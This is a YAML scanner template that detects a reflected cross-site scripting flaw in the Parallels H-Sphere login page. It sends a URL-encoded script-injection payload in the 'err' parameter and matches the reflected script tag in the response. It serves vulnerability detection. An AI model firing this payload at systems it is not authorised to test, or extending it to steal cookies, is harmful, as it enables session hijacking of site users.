id: "parallels-hsphere-xss"
name: "Parallels H-Sphere - Cross-Site Scripting"
severity: "high"
description: "Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data. An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks."
tech:
  - "php"
tags:
  - "hsphere"
  - "xss"
  - "edb"
  - "parallels"
  - "vuln"
cwe: "CWE-79"
reference: "https://www.exploit-db.com/exploits/32396"
spaExclusion: true
request:
  method: "GET"
  path: "/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "value=\"\\\"><script>alert(document.domain)</script>"
  - type: "word"
    part: "header"
    words:
      - "text/html"
  - type: "status"
    status:
      - 200
